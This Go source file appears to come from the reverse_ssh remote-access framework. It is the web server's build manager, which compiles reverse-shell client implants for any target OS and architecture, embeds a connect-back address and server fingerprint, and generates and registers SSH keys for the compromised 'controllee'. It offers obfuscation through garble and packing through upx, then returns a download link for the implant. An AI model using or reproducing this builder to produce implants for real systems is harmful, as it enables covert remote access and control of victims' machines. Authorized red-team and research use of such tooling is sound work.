package webserver

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sync"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/pkg/trie"
	"golang.org/x/crypto/ssh"
)

type file struct {
	CallbackAddress string
	Path            string
	Goos            string
	Goarch          string
	FileType        string
	Hits            int
	Version         string
}

const cacheDescriptionFile = "description.json"

var (
	Autocomplete = trie.NewTrie()

	validPlatforms = make(map[string]bool)
	validArchs     = make(map[string]bool)

	c         sync.RWMutex
	cache     map[string]file = make(map[string]file) // random id to actual file path
	cachePath string
)

func Build(goos, goarch, suppliedConnectBackAdress, fingerprint, name, comment string, shared, upx, garble bool) (string, error) {
	if !webserverOn {
		return "", fmt.Errorf("web server is not enabled.")
	}

	if len(goarch) != 0 && !validArchs[goarch] {
		return "", fmt.Errorf("GOARCH supplied is not valid: " + goarch)
	}

	if len(goos) != 0 && !validPlatforms[goos] {
		return "", fmt.Errorf("GOOS supplied is not valid: " + goos)
	}

	if len(suppliedConnectBackAdress) == 0 {
		suppliedConnectBackAdress = DefaultConnectBack
	}

	if len(fingerprint) == 0 {
		fingerprint = defaultFingerPrint
	}

	if upx {
		_, err := exec.LookPath("upx")
		if err != nil {
			return "", errors.New("upx could not be found in PATH")
		}
	}

	buildTool := "go"
	if garble {
		_, err := exec.LookPath("garble")
		if err != nil {
			return "", errors.New("garble could not be found in PATH")
		}
		buildTool = "garble"
	}

	c.Lock()
	defer c.Unlock()

	var f file

	f.CallbackAddress = suppliedConnectBackAdress

	filename, err := internal.RandomString(16)
	if err != nil {
		return "", err
	}

	if len(name) == 0 {
		name, err = internal.RandomString(16)
		if err != nil {
			return "", err
		}
	}

	if _, ok := cache[name]; ok {
		return "", errors.New("this link name is already in use")
	}

	f.Goos = runtime.GOOS
	if len(goos) > 0 {
		f.Goos = goos
	}

	f.Goarch = runtime.GOARCH
	if len(goarch) > 0 {
		f.Goarch = goarch
	}

	f.Path = filepath.Join(cachePath, filename)
	f.FileType = "executable"
	f.Version = internal.Version + " (guess)"

	repoVersion, err := exec.Command("git", "describe", "--tags").CombinedOutput()
	if err == nil {
		f.Version = string(repoVersion)
	}

	buildArguments := []string{"build"}
	if shared {
		buildArguments = append(buildArguments, "-buildmode=c-shared")
		buildArguments = append(buildArguments, "-tags=cshared")
		f.FileType = "shared-object"
		if f.Goos != "windows" {
			f.Path += ".so"
		} else {
			f.Path += ".dll"
		}

	}

	newPrivateKey, err := internal.GeneratePrivateKey()
	if err != nil {
		return "", err
	}

	sshPriv, err := ssh.ParsePrivateKey(newPrivateKey)
	if err != nil {
		return "", err
	}

	err = os.WriteFile(filepath.Join(projectRoot, "internal/client/keys/private_key"), newPrivateKey, 0600)
	if err != nil {
		return "", err
	}

	publicKeyBytes := ssh.MarshalAuthorizedKey(sshPriv.PublicKey())

	err = os.WriteFile(filepath.Join(projectRoot, "internal/client/keys/private_key.pub"), publicKeyBytes, 0600)
	if err != nil {
		return "", err
	}

	buildArguments = append(buildArguments, fmt.Sprintf("-ldflags=-s -w -X main.destination=%s -X main.fingerprint=%s -X github.com/NHAS/reverse_ssh/internal.Version=%s", suppliedConnectBackAdress, fingerprint, f.Version))
	buildArguments = append(buildArguments, "-o", f.Path, filepath.Join(projectRoot, "/cmd/client"))

	cmd := exec.Command(buildTool, buildArguments...)

	cmd.Env = append(cmd.Env, os.Environ()...)
	cmd.Env = append(cmd.Env, "GOOS="+f.Goos)
	cmd.Env = append(cmd.Env, "GOARCH="+f.Goarch)

	//Building a shared object for windows needs some extra beans
	cgoOn := "0"
	if shared {

		var crossCompiler string
		if runtime.GOOS == "linux" && f.Goos == "windows" && f.Goarch == "amd64" {
			crossCompiler = "x86_64-w64-mingw32-gcc"
		}

		cmd.Env = append(cmd.Env, "CC="+crossCompiler)
		cgoOn = "1"
	}

	cmd.Env = append(cmd.Env, "CGO_ENABLED="+cgoOn)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("Error: " + err.Error() + "\n" + string(output))
	}

	cache[name] = f

	if upx {
		output, err := exec.Command("upx", "-qq", "-f", f.Path).CombinedOutput()
		if err != nil {
			return "", errors.New("unable to run upx: " + err.Error() + ": " + string(output))
		}
	}

	os.Chmod(f.Path, 0600)

	Autocomplete.Add(name)

	writeCache()

	authorizedControlleeKeys, err := os.OpenFile(filepath.Join(cachePath, "../authorized_controllee_keys"), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return "", errors.New("cant open authorized controllee keys file: " + err.Error())
	}

	defer authorizedControlleeKeys.Close()
	if _, err = authorizedControlleeKeys.WriteString(fmt.Sprintf("%s %s\n", publicKeyBytes[:len(publicKeyBytes)-1], comment)); err != nil {
		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
	}

	return "http://" + suppliedConnectBackAdress + "/" + name, nil
}

func Get(key string) (file, error) {
	c.RLock()
	defer c.RUnlock()

	cacheEntry, ok := cache[key]
	if !ok {
		return cacheEntry, errors.New("Unable to find cache entry: " + key)
	}

	cacheEntry.Hits++

	cache[key] = cacheEntry

	return cacheEntry, nil
}

func List(filter string) (matchingFiles map[string]file, err error) {
	_, err = filepath.Match(filter, "")
	if err != nil {
		return nil, fmt.Errorf("filter is not well formed")
	}

	matchingFiles = make(map[string]file)

	c.RLock()
	defer c.RUnlock()

	for id := range cache {
		if filter == "" {
			matchingFiles[id] = cache[id]
			continue
		}

		if match, _ := filepath.Match(filter, id); match {
			matchingFiles[id] = cache[id]
			continue
		}

		file := cache[id]

		if match, _ := filepath.Match(filter, file.Goos); match {
			matchingFiles[id] = cache[id]
			continue
		}

		if match, _ := filepath.Match(filter, file.Goarch); match {
			matchingFiles[id] = cache[id]
			continue
		}
	}

	return
}

func Delete(key string) error {
	c.Lock()
	defer c.Unlock()

	cacheEntry, ok := cache[key]
	if !ok {
		return errors.New("Unable to find cache entry: " + key)
	}

	delete(cache, key)

	writeCache()

	Autocomplete.Remove(key)

	return os.Remove(cacheEntry.Path)
}

func writeCache() {
	content, err := json.Marshal(cache)
	if err != nil {
		panic(err)
	}
	os.WriteFile(filepath.Join(cachePath, cacheDescriptionFile), content, 0700)
}

func startBuildManager(cPath string) error {
	c.Lock()
	defer c.Unlock()

	clientSource := filepath.Join(projectRoot, "/cmd/client")
	info, err := os.Stat(clientSource)
	if err != nil || !info.IsDir() {
		return fmt.Errorf("the server doesnt appear to be in {project_root}/bin, please put it there")
	}

	cmd := exec.Command("go", "tool", "dist", "list")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("unable to run the go compiler to get a list of compilation targets: %s", err)
	}

	platformAndArch := bytes.Split(output, []byte("\n"))

	for _, line := range platformAndArch {
		parts := bytes.Split(line, []byte("/"))
		if len(parts) == 2 {
			validPlatforms[string(parts[0])] = true
			validArchs[string(parts[1])] = true
		}
	}

	info, err = os.Stat(cPath)
	if os.IsNotExist(err) {
		err = os.Mkdir(cPath, 0700)
		if err != nil {
			return err
		}
		info, err = os.Stat(cPath)
	}

	if !info.IsDir() {
		return errors.New("Cache path '" + cPath + "' already exists, but is a file instead of directory")
	}

	err = os.WriteFile(filepath.Join(cPath, "test"), []byte("test"), 0700)
	if err != nil {
		return errors.New("Unable to write file into cache directory: " + err.Error())
	}

	err = os.Remove(filepath.Join(cPath, "test"))
	if err != nil {
		return errors.New("Unable to delete file in cache directory: " + err.Error())
	}

	contents, err := os.ReadFile(filepath.Join(cPath, cacheDescriptionFile))
	if err == nil {
		err = json.Unmarshal(contents, &cache)
		if err == nil {
			for id := range cache {
				Autocomplete.Add(id)
			}
		} else {
			log.Println("Unable to load cache: ", err)
		}
	} else {
		log.Println("Unable to load cache: ", err)
	}

	cachePath = cPath

	return nil
}
